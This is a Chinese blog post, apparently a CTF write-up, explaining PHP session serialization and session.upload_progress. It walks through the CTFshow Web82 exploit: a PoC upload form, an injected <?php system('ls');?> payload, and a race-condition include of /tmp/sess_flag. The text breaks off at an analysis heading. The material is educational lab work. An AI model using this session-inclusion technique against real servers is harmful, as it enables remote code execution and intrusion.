<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>不要捉弄我新人同学: S - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="不要捉弄我新人同学: S - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AS/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T09:43:44.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">不要捉弄我新人同学: S</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="什么是SESSION"><a href="#什么是SESSION" class="headerlink" title="什么是SESSION?"></a>什么是SESSION?</h2><p>官方Session定义：在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。主要有以下特点：</p>
<p>session保存的位置是在服务器端<br>session通常是要配合cookie使用<br>因为HTTP的无状态性，服务端产生了session来标识当前的用户状态</p>
<p>本质上，session就是一种可以维持服务器端的数据存储技术。即session技术就是一种基于后端有别于数据库的临时存储数据的技术</p>
<h2 id="SESSION的工作流程"><a href="#SESSION的工作流程" class="headerlink" title="SESSION的工作流程"></a>SESSION的工作流程</h2><p>以PHP为例，理解session的原理<br>PHP脚本使用 session_start()时开启session会话，会自动检测PHPSESSID<br>如果Cookie中存在，获取PHPSESSID<br>如果Cookie中不存在，创建一个PHPSESSID，并通过响应头以Cookie形式保存到浏览器<br>初始化超全局变量$_SESSION为一个空数组<br>PHP通过PHPSESSID去指定位置（PHPSESSID文件存储位置）匹配对应的文件<br>存在该文件：读取文件内容（通过反序列化方式），将数据存储到$_SESSION中<br>不存在该文件： session_start()创建一个PHPSESSID命名文件<br>程序执行结束，将$_SESSION中保存的所有数据序列化存储到PHPSESSID对应的文件中<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662315289888-aabbcb75-c036-4c6c-9259-87a380e96a68.png#averageHue=%23828076&clientId=uc24b215f-98f9-4&from=paste&id=uad4f931e&name=image.png&originHeight=1478&originWidth=2675&originalType=url&ratio=1&rotation=0&showTitle=false&size=697073&status=done&style=none&taskId=u1a6396c4-10ba-481e-9c00-5da4324e40e&title=" alt="image.png"></p>
<h2 id="PHP-session序列化机制"><a href="#PHP-session序列化机制" class="headerlink" title="PHP session序列化机制"></a>PHP session序列化机制</h2><p>根据php.ini中的配置项，我们研究将$_SESSION中保存的所有数据序列化存储到PHPSESSID对应的文件中，使用的三种不同的处理格式，即session.serialize_handler定义的三种引擎：</p>
<table>
<thead>
<tr>
<th><strong>处理器</strong></th>
<th><strong>对应的存储格式</strong></th>
</tr>
</thead>
<tbody><tr>
<td>php(默认的）</td>
<td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td>php_serialize (php&gt;&#x3D;5.5.4)</td>
<td>经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody></table>
<h3 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h3><p>首先来看看默认session.serialize_handler &#x3D; php时候的序列化结果，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662326272176-6dee5d5d-4d71-4f3f-9cd5-686607bb1ea2.png#averageHue=%2330302d&clientId=u2df233a7-228d-4&from=paste&height=192&id=uc55bb313&name=image.png&originHeight=264&originWidth=663&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28940&status=done&style=none&taskId=u7c619f7f-fbdd-4123-9d86-e2cd27ce995&title=&width=482.1818181818182" alt="image.png"><br>文件名为sess_mpnnbont606f50eb178na451od，其中mpnnbont606f50eb178na451od就是后续请求头中Cookie携带的PHPSESSID的值<br>2、文件内容<br>php处理器存储格式</p>
<table>
<thead>
<tr>
<th><strong>键名</strong></th>
<th><strong>竖线</strong></th>
<th><strong>经过 serialize() 函数反序列处理的值</strong></th>
</tr>
</thead>
<tbody><tr>
<td>$_SESSION[‘name’]的键名：name</td>
<td>&amp;#124;</td>
<td>s:6:“harden”;</td>
</tr>
</tbody></table>
<h3 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h3><p>使用php_binary处理器（二进制），即session.serialize_handler &#x3D; php_binary </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment"># 为了方便ACSII显示，将键名设置为36个字符长度</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>文件名都一样<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662326338019-be1d263d-60a2-4d4a-8bb3-9f2373d8f576.png#averageHue=%2330302d&clientId=u2df233a7-228d-4&from=paste&height=139&id=u8fcd1961&name=image.png&originHeight=191&originWidth=807&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29271&status=done&style=none&taskId=udfc3cb59-c758-42a5-a7e6-48d769ea421&title=&width=586.9090909090909" alt="image.png"></p>
<table>
<thead>
<tr>
<th><strong>键名的长度对应的 ASCII 字符</strong></th>
<th><strong>键名</strong></th>
<th><strong>经过 serialize() 函数反序列处理的值.</strong></th>
</tr>
</thead>
<tbody><tr>
<td>$</td>
<td>namenamenamenamenamenamenamenamename</td>
<td>s:6:“harden”;</td>
</tr>
</tbody></table>
<h3 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h3><p>使用php_binary处理器，即session.serialize_handler &#x3D; php_serialize</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662326369267-b773da5c-cb87-4b81-af17-618c847bd37d.png#averageHue=%232f302c&clientId=u2df233a7-228d-4&from=paste&height=163&id=u6f05014e&name=image.png&originHeight=224&originWidth=700&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31622&status=done&style=none&taskId=ua983969a-79d2-4904-96af-70ec7cf9472&title=&width=509.09090909090907" alt="image.png"><br>文件内容为反序列化后的数组：a:1:{s:4:”name”;s:6:”harden”;}</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>以上三种为php序列化的机制，如果一个服务器有2个页面用的是不同的处理器很可能就会出现SESSION反序列化漏洞，这个现在先不谈，我还没做到那里</p>
<h2 id="php中的seesion-upload-progress"><a href="#php中的seesion-upload-progress" class="headerlink" title="php中的seesion_upload_progress"></a>php中的seesion_upload_progress</h2><p>php.ini下有这些默认选项</p>
<blockquote>
<ol>
<li>session.upload_progress.enabled &#x3D; on</li>
<li>session.upload_progress.cleanup &#x3D; on</li>
<li>session.upload_progress.prefix &#x3D; “upload_progress_”</li>
<li>session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”</li>
<li>session.upload_progress.freq &#x3D; “1%”</li>
<li>session.upload_progress.min_freq &#x3D; “1”</li>
</ol>
</blockquote>
<ul>
<li>enabled&#x3D;on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</li>
<li><strong>cleanup&#x3D;on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</strong></li>
<li>name:当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</li>
<li><strong>prefix+name将表示为session中的键名</strong></li>
<li>session.upload_progress.prefix就是字符串”upload_progress_”</li>
</ul>
<h3 id="prefix-name"><a href="#prefix-name" class="headerlink" title="prefix+name"></a>prefix+name</h3><p>当我们POST传入session.upload_progess.name的同名变量(即别称)PHP_SESSION_UPLOAD_PROGRESS时，$_SESSION数组内会新增一个键值对</p>
<ul>
<li>键名：就是session.upload_progress.prefix+session.upload_progress.name</li>
</ul>
<p>这里的session.upload_progress.name也就是PHP_SESSION_UPLOAD_PROGRESS的值</p>
<ul>
<li>键值：接下来引入一个例子来讲</li>
</ul>
<h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><p><strong>在这我们写一个提交文件的代码：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&lt;?php echo ini_get(&quot;</span><span class="attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;</span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里面<?php echo ini_get("session.upload_progress.name"); ?>可以直接换成 PHP_SESSION_UPLOAD_PROGRESS</p>
<ul>
<li>ini_get：就是获取php.ini里面参数的值</li>
</ul>
<p>这里的123就是PHP_SESSION_UPLOAD_PROGRESS的值<br>上传后我们$_SESSION数组中就会多出以下的键值对：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_progress_123&quot;</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time  请求时间</span></span><br><span class="line">    <span class="string">&quot;content_length&quot;</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length 长度</span></span><br><span class="line">    <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed 已接收字节</span></span><br><span class="line">    <span class="string">&quot;done&quot;</span> =&gt; <span class="literal">false</span>,              <span class="comment">// true when the POST handler has finished, successfully or not 是否上传完成</span></span><br><span class="line">    <span class="string">&quot;files&quot;</span> =&gt; <span class="keyword">array</span>(<span class="comment">//上传的文件</span></span><br><span class="line">                     <span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                       <span class="string">&quot;field_name&quot;</span> =&gt; <span class="string">&quot;file1&quot;</span>,       <span class="comment">// Name of the &lt;input/&gt; field  input中设定的变量名</span></span><br><span class="line">                       <span class="comment">// The following 3 elements equals those in $_FILES             </span></span><br><span class="line">                       <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;foo.avi&quot;</span>,           <span class="comment">//文件名</span></span><br><span class="line">                       <span class="string">&quot;tmp_name&quot;</span> =&gt; <span class="string">&quot;/tmp/phpxxxxxx&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;error&quot;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                       <span class="string">&quot;done&quot;</span> =&gt; <span class="literal">true</span>,                <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line">                       <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567890</span>,    <span class="comment">// When this file has started to be processed</span></span><br><span class="line">                       <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">57343250</span>, <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span class="line">                     ),</span><br><span class="line">                    )</span><br><span class="line">  );</span><br></pre></td></tr></table></figure>
<p>这里的键名”upload_progress_123”，就是由我们上面所说的session.upload_progress.prefix+session.upload_progress.name<br>其中session.upload_progress.prefix是upload_progress_，session.upload_progress.name是123<br>这时候session文件的内容里面会有一段</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">19</span>:<span class="string">&quot;upload_progress_123&quot;</span>;........................等等</span><br></pre></td></tr></table></figure>
<p>这里面我们的可控参数就是session.upload_progress.name：123了，我们可以通过修改session.upload_progress.name的值来达到命令执行的目的<br><strong>这里需要补充一下，写入session文件的是序列化后的内容</strong><br><strong>总结:</strong></p>
<ul>
<li><strong>注入点1：</strong>session.upload_progress.name</li>
<li><strong>注入点2：</strong>name</li>
<li><strong>注入点3：</strong>field_name</li>
</ul>
<p>以上这三个都是我们可以控制的值，我们只需要把这三个地方修改成需要执行的代码即可</p>
<h2 id="利用session-upload-progress进行文件包含"><a href="#利用session-upload-progress进行文件包含" class="headerlink" title="利用session_upload_progress进行文件包含"></a>利用session_upload_progress进行文件包含</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原理就和上面讲的一样，session.upload_progess.name给我们提供了注入点<br>当网页的代码中有文件包含函数require()，require_once()，include()，include_once()时，我们就可以包含文件，执行内部的代码，达到我们的目的</p>
<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>所谓的条件竞争</p>
<ul>
<li>第一种：当函数体内有判断函数时，判断正确与否是需要时间的，我们通过脚本用多个线程运行这段代码，我们线程越多速度就越快，可以从判断这段时间间隙中去绕过判断</li>
<li>第二种：session文件一般默认是执行完函数就删除内容的，但是删除内容也需要时间，和第一种一样，用多个线程跑，利用时间差去把数据存入session文件</li>
</ul>
<h3 id="CTFSHOW——Web82"><a href="#CTFSHOW——Web82" class="headerlink" title="CTFSHOW——Web82"></a>CTFSHOW——Web82</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一题一不能使用2个伪协议，二不能使用包含日志文件，这一题考虑条件竞争</p>
<ul>
<li>首先我们明确第一点，session文件的名字我们是可以控制的</li>
</ul>
<p>如果我们COOKIE传入PHPSESSID&#x3D;aaaa，那么对应的session文件的名字就是sess_aaaa<br><strong>所以第一点，文件名称可以控制</strong></p>
<ul>
<li><p>其次文件的内容我们可以通过上面的介绍可以知道，我们用SESSION_UPLOAD_PROGRESS可以把内容写进session文件里</p>
</li>
<li><p>最后写入了文件内容，我们需要include包含这个文件，达到命令执行的效果</p>
</li>
</ul>
<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>首先利用一个小脚本去给这个靶场上传一个文件，然后进行抓包，<br>脚本：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://6e62b0ec-d001-4b09-a568-d105c92e3da6.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662323748435-3b068d4f-69db-4292-9772-005ebfd8d354.png#averageHue=%23f8f7f7&clientId=uae512af3-b93c-4&from=paste&height=481&id=ue0403e56&name=image.png&originHeight=601&originWidth=1247&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91219&status=done&style=none&taskId=u4f0d4d56-b19b-42a7-adcd-fa1bd0783b5&title=&width=997.6" alt="image.png"></p>
<p>可以看到已经有PHP_SESSION_UPLOAD_PROGRESS的值，我们把他的值改为我们要执行的代码，如<?php system('ls');?><br>再加入一个<strong>COOKIE:PHPSESSID&#x3D;flag</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662324098581-59d2c25b-d686-4a2a-9081-2dbf5cbfb46e.png#averageHue=%23f6f6f5&clientId=uae512af3-b93c-4&from=paste&height=409&id=ucd9dd541&name=image.png&originHeight=511&originWidth=682&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74455&status=done&style=none&taskId=u915b0dc3-1e6e-4293-95e2-19869056aa4&title=&width=545.6" alt="image.png"></p>
<p>然后我们再抓一个get类型的包，就是在靶场get传入一个file&#x3D;1：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662323933750-6b2385b5-43cc-49d9-a3ff-6cc5e41944e9.png#averageHue=%23f8f7f7&clientId=uae512af3-b93c-4&from=paste&height=355&id=ubb263ebc&name=image.png&originHeight=444&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41921&status=done&style=none&taskId=uf83a9188-8c54-40f4-b548-37305360b83&title=&width=548.8" alt="image.png"><br>然后把file改成file&#x3D;&#x2F;tmp&#x2F;sess_flag,然后POST和GET同时进行爆破，这边我选了10线程<br>ps：这边爆破就是随便找个没用的内容，然后往里面爆破字典达到多次跑代码的效果<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662324213164-681c4e93-d91b-40ee-bd2b-67fc17c7655f.png#averageHue=%23f5f5f4&clientId=uae512af3-b93c-4&from=paste&height=216&id=uf90ce60b&name=image.png&originHeight=270&originWidth=489&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35914&status=done&style=none&taskId=u0ff4c3d0-9d2c-41ac-a3e7-17fc46f9d5a&title=&width=391.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662324345493-fa4264d4-f827-4763-9e04-da135bbbb285.png#averageHue=%23f8f8f8&clientId=uae512af3-b93c-4&from=paste&height=226&id=u005e4597&name=image.png&originHeight=282&originWidth=699&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31650&status=done&style=none&taskId=u5c129d0e-1069-4ac7-b706-041d37bc458&title=&width=559.2" alt="image.png"><br>结果：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662324675635-acc6741b-33ab-45b3-9f9f-5e4e54479e50.png#averageHue=%23f8f6f4&clientId=uae512af3-b93c-4&from=paste&height=465&id=uae5d01ab&name=image.png&originHeight=581&originWidth=1150&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99230&status=done&style=none&taskId=u1ab138b4-b880-4980-be98-309909ffc0a&title=&width=920" alt="image.png">诺，可以看到已经出来答案了，fl0g.php和index.php就是当前目录的文件</p>
<h5 id="分析一下"><a href="#分析一下" class="headerlink" title="分析一下"></a>分析一下</h5><p>我们来看看回显这一段代码：</p>
